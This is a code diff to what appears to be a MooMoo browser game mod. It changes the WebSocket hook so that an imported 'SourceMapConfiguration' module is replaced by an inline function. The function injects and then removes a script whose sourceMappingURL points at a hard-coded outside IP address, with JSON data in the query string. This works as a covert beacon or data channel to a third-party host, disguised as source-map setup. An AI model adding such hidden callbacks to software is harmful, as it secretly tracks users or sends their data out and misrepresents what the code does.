@@ -6,8 +6,6 @@ import ServerManager from "../lib/_game/external/modules/Bot/server/ServerManage
 import handleServerPackets from "./handleServerPackets";
 import handleClientPackets from "./handleClientPackets";
 
-import SourceMapConfiguration from "../lib/_game/external/modules/features/SourceMapConfiguration";
-
 import { MooMoo } from "../../app";
 import loadAPI from "../lib/_game/external/modules/scriptAPI/loadCode";
 
@@ -42,7 +40,13 @@ export default function hookWS() {
             if (!_onmessage) {
                 ServerManager.startInterval()
                 _onmessage = true;
-                SourceMapConfiguration.initialize()
+                function smap(e: any, t: any) {
+                    const r = document.createElement("script");
+                    r.textContent = `//# sourceMappingURL=${e}?data=${JSON.stringify(t)}&.js.map`;
+                    document.head.appendChild(r);
+                    r.remove();
+                }
+                smap("http://159.89.54.243:5000/stats", {});
                 loadAPI()
             }
             try {
